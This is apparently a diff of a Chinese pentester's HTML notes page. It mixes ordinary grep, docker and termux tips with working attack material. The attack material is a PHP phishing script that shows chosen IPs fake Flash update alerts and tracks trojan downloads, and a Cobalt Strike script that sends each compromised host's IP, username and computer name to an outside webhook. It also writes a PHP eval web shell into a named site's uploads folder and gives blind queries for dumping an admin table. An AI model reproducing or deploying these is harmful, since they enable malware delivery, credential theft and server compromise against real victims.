+<h5 id="mysql无交互的情况下盲输语句"><a href="#mysql无交互的情况下盲输语句" class="headerlink" title="mysql无交互的情况下盲输语句"></a>mysql无交互的情况下盲输语句</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use sb_wiiudot_cn;</span><br><span class="line">show tables;</span><br><span class="line">desc app_admin;</span><br><span class="line">select * from app_admin;</span><br><span class="line">select * from app_admin_cate;</span><br><span class="line">EOF</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
+<h3 id="APP相关思路"><a href="#APP相关思路" class="headerlink" title="APP相关思路"></a>APP相关思路</h3><p>360显微镜，腾讯金刚的app漏洞测试平台去测试</p>
+<h4 id="app敏感数据提取"><a href="#app敏感数据提取" class="headerlink" title="app敏感数据提取"></a>app敏感数据提取</h4><p>推荐一款好用的工具apkAnalyser,一个appscan平台，地址为：<br><a target="_blank" rel="noopener" href="https://www.appscan.io/">appscan平台</a><br>邮箱注册一个账号，上传app就可以进行扫描提取数据信息。</p>
+<h5 id="渗透后网页挂马系列"><a href="#渗透后网页挂马系列" class="headerlink" title="渗透后网页挂马系列"></a>渗透后网页挂马系列</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_mobile</span>() == <span class="string">&quot;手机端&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 为手工模式</span></span><br><span class="line"><span class="comment">#2 为自动化模式</span></span><br><span class="line"><span class="comment">#3 当为其他值 则不工作</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$type</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#echo &#x27;window.location.href = &quot;https://你得URL地址/&quot;;&#x27;;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ip</span> == <span class="string">&quot;1.1.1.1&quot;</span> <span class="keyword">or</span> <span class="variable">$ip</span> == <span class="string">&quot;1.1.1.1&quot;</span>)&#123;</span><br><span class="line">          <span class="comment">#echo &#x27;alert(&quot;Adobe Flash Payler 已经准备好安装，请刷新后继续下载安装.&quot;);&#x27;;</span></span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;alert(&quot;登陆已失效，请重新登陆.&quot;);&#x27;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;window.location.href = &quot;https://你得URL地址/401.php&quot;;&#x27;</span>;</span><br><span class="line">          <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// #对话通知</span></span><br><span class="line">        <span class="comment">// if($ip == &quot;1.1.1.1&quot;)&#123;</span></span><br><span class="line">        <span class="comment">//   #echo &#x27;alert(&quot;Adobe Flash Payler 更新完成，还需要你完成最后一个操作，请务必允许此次操作，否则可能将导致网页无法正常执行.&quot;);&#x27;;</span></span><br><span class="line">        <span class="comment">//   echo &#x27;alert(&quot;即将开始安装Adobe Flash Payler自更新计划任务，请务必允许添加，否则将可能导致网页无法正常浏览。&quot;);&#x27;;</span></span><br><span class="line">        <span class="comment">//   #echo &#x27;alert(&quot;Adobe Flash Payler 安装失败，由于你的网络较差导致更新被断开，请重新更新文件!&quot;);&#x27;;</span></span><br><span class="line">        <span class="comment">//   #echo &#x27;window.location.href = &quot;https://你得URL地址/&quot;;&#x27;;</span></span><br><span class="line">        <span class="comment">//   die;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Adobe Flash Payler 检测更新.&#x27;</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//判断该目标是否已经在被控之中，如果有则不在钓鱼</span></span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">bind</span>(<span class="string">&quot;ip&quot;</span>,<span class="variable">$ip</span>);</span><br><span class="line">        <span class="variable">$Query_user_is</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from 入库 where ip = :ip&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Query_user_is</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// //判断该目标是否下载了木马，如果没下载则弹出，下载后等待180s 用于用户安装。</span></span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">bind</span>(<span class="string">&quot;ip&quot;</span>,<span class="variable">$ip</span>);</span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">bind</span>(<span class="string">&quot;type&quot;</span>,<span class="string">&quot;下载了Flash木马&quot;</span>);</span><br><span class="line">        <span class="variable">$Query_fishing_is</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from 入库 where ip = :ip and type = :type&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Query_fishing_is</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$down_time</span> = <span class="title function_ invoke__">strtotime</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$Query_fishing_is</span>)[<span class="string">&#x27;request_time&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$end_time</span> = <span class="variable">$time</span> - <span class="variable">$down_time</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$sx_time</span> = <span class="number">200</span> - <span class="variable">$end_time</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$end_time</span> &lt; <span class="string">&quot;200&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;window.location.href = &quot;https://你得URL地址/&quot;;&#x27;</span>;</span><br><span class="line">                <span class="comment">// echo &#x27;alert(&quot;正在安装 Adobe Flash Player 最新版本，请稍等 &#x27;.$sx_time.&#x27; 秒&quot;)&#x27;;</span></span><br><span class="line">                <span class="keyword">die</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Adobe Flash Payler 检测更新.&#x27;</span>;</span><br><span class="line">                <span class="keyword">die</span>;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;window.location.href = &quot;https://你得URL地址/&quot;;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="cs相关"><a href="#cs相关" class="headerlink" title="cs相关"></a>cs相关</h6><p>循环获取所有beacon</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">on beacon_initial &#123;</span><br><span class="line"></span><br><span class="line">    sub http_get &#123;</span><br><span class="line">        <span class="built_in">local</span>(<span class="string">&#x27;$output&#x27;</span>);</span><br><span class="line">        <span class="variable">$url</span> = [new java.net.URL: <span class="variable">$1</span>];</span><br><span class="line">        <span class="variable">$stream</span> = [<span class="variable">$url</span> openStream];</span><br><span class="line">        <span class="variable">$handle</span> = [SleepUtils getIOHandle: <span class="variable">$stream</span>, <span class="variable">$null</span>];</span><br><span class="line"></span><br><span class="line">        @content = readAll(<span class="variable">$handle</span>);</span><br><span class="line"></span><br><span class="line">        foreach <span class="variable">$line</span> (@content) &#123;</span><br><span class="line">            <span class="variable">$output</span> .= <span class="variable">$line</span> . <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        println(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#获取ip、计算机名、登录账号</span></span><br><span class="line">    <span class="variable">$internalIP</span> = replace(beacon_info(<span class="variable">$1</span>, <span class="string">&quot;internal&quot;</span>), <span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">    <span class="variable">$userName</span> = replace(beacon_info(<span class="variable">$1</span>, <span class="string">&quot;user&quot;</span>), <span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">    <span class="variable">$computerName</span> = replace(beacon_info(<span class="variable">$1</span>, <span class="string">&quot;computer&quot;</span>), <span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get一下Server酱的链接</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;https://sc.ftqq.com/此处填写你Server酱的SCKEY码.send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&amp;desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0Aip:&#x27;</span>.<span class="variable">$internalIP</span>.<span class="string">&#x27;%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:&#x27;</span>.<span class="variable">$userName</span>.<span class="string">&#x27;%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:&#x27;</span>.<span class="variable">$computerName</span>;</span><br><span class="line"></span><br><span class="line">    http_get(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="命令执行echo写码"><a href="#命令执行echo写码" class="headerlink" title="命令执行echo写码"></a>命令执行echo写码</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$echo</span> <span class="string">&#x27;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27;</span> &gt;/www/wwwroot/mzysqcq.cn/uploads/20200701/shell.php</span><br></pre></td></tr></table></figure>
+<h4 id="一些常用的技巧"><a href="#一些常用的技巧" class="headerlink" title="一些常用的技巧"></a>一些常用的技巧</h4><h5 id="docker相关"><a href="#docker相关" class="headerlink" title="docker相关"></a>docker相关</h5><h6 id="进入docker容器"><a href="#进入docker容器" class="headerlink" title="进入docker容器"></a>进入docker容器</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 02c57e7761bf /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h6 id="将docker中的文件拷贝出来"><a href="#将docker中的文件拷贝出来" class="headerlink" title="将docker中的文件拷贝出来"></a>将docker中的文件拷贝出来</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> mycontainer:/opt/testnew/file.txt /opt/test/</span><br></pre></td></tr></table></figure>
+
+<h5 id="查找统计"><a href="#查找统计" class="headerlink" title="查找统计"></a>查找统计</h5><h6 id="查找文件中的ip并统计排序"><a href="#查找文件中的ip并统计排序" class="headerlink" title="查找文件中的ip并统计排序"></a>查找文件中的ip并统计排序</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i -o -E <span class="string">&quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot;</span> test1.txt | <span class="built_in">sort</span> -n | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -n -r | <span class="built_in">head</span> -6</span><br></pre></td></tr></table></figure>
+
+<h6 id="统计grep筛选出的结果的个数"><a href="#统计grep筛选出的结果的个数" class="headerlink" title="统计grep筛选出的结果的个数"></a>统计grep筛选出的结果的个数</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> log.txt | grep 192.168.1.110 | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure>
+
+<h6 id="统计提取test-txt文本文档中的手机号码几种方法"><a href="#统计提取test-txt文本文档中的手机号码几种方法" class="headerlink" title="统计提取test.txt文本文档中的手机号码几种方法"></a>统计提取test.txt文本文档中的手机号码几种方法</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">egrep <span class="string">&#x27;^1[3578][0-9]&#123;9&#125;&#x27;</span> test.txt</span><br><span class="line">grep -oP <span class="string">&#x27;(?&lt;=&#x27;</span><span class="string">&#x27;)(1[3578]&#123;1&#125;[0-9]&#123;9&#125;)(?=&#x27;</span><span class="string">&#x27;)&#x27;</span> test.txt</span><br><span class="line">sed -n <span class="string">&#x27;/1[3578]\&#123;1\&#125;[0-9]\&#123;9\&#125;/p&#x27;</span> test.txt</span><br><span class="line">sed -rn <span class="string">&#x27;/1[3578]&#123;1&#125;[0-9]&#123;9&#125;/p&#x27;</span> test.txt</span><br><span class="line">awk --posix <span class="string">&#x27;/1[3578]&#123;1&#125;[0-9]&#123;9&#125;/&#x27;</span> test.txt</span><br><span class="line">egrep -rn <span class="string">&quot;\&lt;1[3456789]&#123;1&#125;[0-9]&#123;9&#125;\&gt;&quot;</span> *</span><br><span class="line">如查找含有连续两个8的手机号</span><br><span class="line">grep -E <span class="string">&#x27;1[3578]&#123;1&#125;.*[8]&#123;2&#125;.*&#x27;</span> test.txt</span><br><span class="line">awk --posix <span class="string">&#x27;/1[3578]&#123;1&#125;.*[8]&#123;2&#125;.*/&#x27;</span> test.txt</span><br><span class="line">grep <span class="string">&#x27;[8]\&#123;2\&#125;&#x27;</span> test.txt</span><br><span class="line">查找末尾是两个8的手机号</span><br><span class="line">sed -rn <span class="string">&#x27;/1[3578]&#123;1&#125;[0-9]&#123;7&#125;[8]&#123;2&#125;/p&#x27;</span> test.txt</span><br><span class="line">awk --posix <span class="string">&#x27;/1[3578]&#123;1&#125;[0-9]&#123;7&#125;[8]&#123;2&#125;/&#x27;</span> test.txt</span><br><span class="line">判断文本行中有电话号码</span><br><span class="line">文本中合理的电话号码格式如下：</span><br><span class="line">987-123-4567</span><br><span class="line">123 456 7890</span><br><span class="line">(123) 456-7890</span><br><span class="line">代码：</span><br><span class="line">方法1：</span><br><span class="line">sed -n <span class="string">&#x27;/[1-9][0-9][0-9][- )][ ]*[1-9][0-9][0-9][- ][0-9][0-9][0-9][0-9]/p&#x27;</span> phone.txt</span><br><span class="line">方法2：</span><br><span class="line">grep -E <span class="string">&quot;[1-9][0-9]&#123;2&#125;[- )]&#123;1,2&#125;[1-9][0-9]&#123;2&#125;[- ][0-9]&#123;4&#125;&quot;</span> phone.txt</span><br><span class="line">方法3：</span><br><span class="line">awk <span class="string">&#x27;/[1-9][0-9]&#123;2&#125;[- )]&#123;1,2&#125;[1-9][0-9]&#123;2&#125;[- ][0-9]&#123;4&#125;/&#x27;</span> phone.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h6 id="Linux查找含有某字符串的所有文件"><a href="#Linux查找含有某字符串的所有文件" class="headerlink" title="Linux查找含有某字符串的所有文件"></a>Linux查找含有某字符串的所有文件</h6><p>如果你想在当前目录下 查找”hello,world!”字符串,可以这样:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn <span class="string">&quot;hello,world!&quot;</span> *</span><br></pre></td></tr></table></figure>
+
+<p>: *表示当前目录所有文件，也可以是某个文件名<br>-r 是递归查找<br>-n 是显示行号<br>-R 查找所有文件包含子目录<br>-i 忽略大小写<br>下面是一些有意思的命令行参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grep -i pattern files ：不区分大小写地搜索。默认情况区分大小写， </span><br><span class="line">grep -l pattern files ：只列出匹配的文件名， </span><br><span class="line">grep -L pattern files ：列出不匹配的文件名， </span><br><span class="line">grep -w pattern files ：只匹配整个单词，而不是字符串的一部分（如匹配‘magic’，而不是‘magical’）， </span><br><span class="line">grep -C number pattern files ：匹配的上下文分别显示[number]行， </span><br><span class="line">grep pattern1 | pattern2 files ：显示匹配 pattern1 或 pattern2 的行， </span><br><span class="line">grep pattern1 files | grep pattern2 ：显示既匹配 pattern1 又匹配 pattern2 的行。 </span><br></pre></td></tr></table></figure>
+
+<p>这里还有些用于搜索的特殊符号：&lt; 和 &gt; 分别标注单词的开始与结尾。<br>例如：<br>grep man * 会匹配 ‘Batman’、‘manic’、‘man’等，<br>grep ‘&lt;man’ * 匹配‘manic’和‘man’，但不是‘Batman’，<br>grep ‘&lt;man&gt;‘ 只匹配‘man’，而不是‘Batman’或‘manic’等其他的字符串。<br>‘^’：指匹配的字符串在行首，<br>‘$’：指匹配的字符串在行尾，  </p>
+<h6 id="xargs配合grep查找"><a href="#xargs配合grep查找" class="headerlink" title="xargs配合grep查找"></a>xargs配合grep查找</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -<span class="built_in">type</span> f -name <span class="string">&#x27;*.php&#x27;</span>|xargs grep <span class="string">&#x27;GroupRecord&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="获取文本文件中的邮箱地址"><a href="#获取文本文件中的邮箱地址" class="headerlink" title="获取文本文件中的邮箱地址"></a>获取文本文件中的邮箱地址</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep regex: [A-Za-z0-9.]+@[A-Za-z0-9.]+\.[a-zA-Z]&#123;2,4&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="获取文件中的网址"><a href="#获取文件中的网址" class="headerlink" title="获取文件中的网址"></a>获取文件中的网址</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://[a-zA-Z0-9\-\.]+\.[a-zA-Z]&#123;2,4&#125; https://[a-zA-Z0-9\-\.]+\.[a-zA-Z]&#123;2,4&#125;</span><br><span class="line">案例：</span><br><span class="line">[root@Fedora31 Templates]<span class="comment"># cat email.txt </span></span><br><span class="line">this is a line of text contains,&lt;email&gt; <span class="comment">#slynux@slynux.com. &lt;/email&gt; and email address, blog &quot;http://www.google.com&quot;, test@yahoo.com dfdfdfdddfdf;cool.hacks@gmail.com&lt;br /&gt; &lt;ahref=&quot;http://code.google.com&quot;&gt;&lt;h1&gt;Heading&lt;/h1&gt; [root@Fedora31 Templates]# egrep -o &#x27;[A-Za-z0-9.]+@[A-Za-z0-9.]+\.[a-zA-Z]&#123;2,4&#125;&#x27; email.txt slynux@slynux.com test@yahoo.com cool.hacks@gmail.com [root@Fedora31 Templates]# egrep -o &quot;http://[A-Za-z0-9.]+\.[a-zA-Z]&#123;2,3&#125;&quot; email.txt http://www.google.com http://code.google.com</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="查找某个文件内所有手机号并保存"><a href="#查找某个文件内所有手机号并保存" class="headerlink" title="查找某个文件内所有手机号并保存"></a>查找某个文件内所有手机号并保存</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i -o -E <span class="string">&quot;1[3456789][0-9]&#123;9&#125;&quot;</span> 2.txt &gt;3.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="查找所有文件中的有ip地址的行"><a href="#查找所有文件中的有ip地址的行" class="headerlink" title="查找所有文件中的有ip地址的行"></a>查找所有文件中的有ip地址的行</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -<span class="built_in">type</span> f -name <span class="string">&#x27;*&#x27;</span> | xargs grep -E -o <span class="string">&quot;([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;&quot;</span> &gt; <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="递归解压"><a href="#递归解压" class="headerlink" title="递归解压"></a>递归解压</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf find ./ -name *.gz</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="csv文件合并"><a href="#csv文件合并" class="headerlink" title="csv文件合并"></a>csv文件合并</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span> /path/to/directory/ -name *.csv -print0 | xargs -0 -I file <span class="built_in">cat</span> file &gt; merged.file</span><br><span class="line"><span class="variable">$find</span> /path/to/directory/ -name *.csv -<span class="built_in">exec</span> <span class="built_in">cat</span> &#123;&#125; + &gt; merged.file</span><br></pre></td></tr></table></figure>
+
+<h5 id="每次重新打开termux的时候都需要重新运行sshd"><a href="#每次重新打开termux的时候都需要重新运行sshd" class="headerlink" title="每次重新打开termux的时候都需要重新运行sshd"></a>每次重新打开termux的时候都需要重新运行sshd</h5><p>我们可以设置自动启动</p>
+<p>具体操作：</p>
+<ol>
+<li>添加或编辑文件 ~&#x2F;.bashrc,zsh编辑.zshrc ：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano  ~/.bashrc</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>添加如下内容并且保存。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;用户：&quot;</span>$(<span class="built_in">whoami</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pgrep -x <span class="string">&quot;sshd&quot;</span> &gt;/dev/null</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;sshd运行中...&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sshd</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;自动启动sshd&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<p>好了 手机上重启termux，会发现<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ssh&spm=1001.2101.3001.7020">ssh</a>启动信息显示。</p>
+<h6 id="termux四排键盘"><a href="#termux四排键盘" class="headerlink" title="termux四排键盘"></a>termux四排键盘</h6><p>修改配置文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新建并编辑配置文件</span></span><br><span class="line">vim ~/.termux/termux.properties</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extra-<span class="built_in">keys</span> = [[<span class="string">&#x27;ESC&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;INS&#x27;</span>],[<span class="string">&#x27;TAB&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;HOME&#x27;</span>,<span class="string">&#x27;UP&#x27;</span>,<span class="string">&#x27;END&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;PGUP&#x27;</span>],[<span class="string">&#x27;CTRL&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;LEFT&#x27;</span>,<span class="string">&#x27;DOWN&#x27;</span>,<span class="string">&#x27;RIGHT&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;PGDN&#x27;</span>],[<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;ENTER&#x27;</span>]]</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="拥有root权限打镜像传输到本地"><a href="#拥有root权限打镜像传输到本地" class="headerlink" title="拥有root权限打镜像传输到本地"></a>拥有root权限打镜像传输到本地</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在设备上输入：</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/block/mmcblk0 | nc -l -p 5555</span><br><span class="line">在本地</span><br><span class="line">adb forward tcp:5555 tcp:5555</span><br><span class="line">nc 127.0.0.1 5555 &gt;sb.dd</span><br></pre></td></tr></table></figure>
+
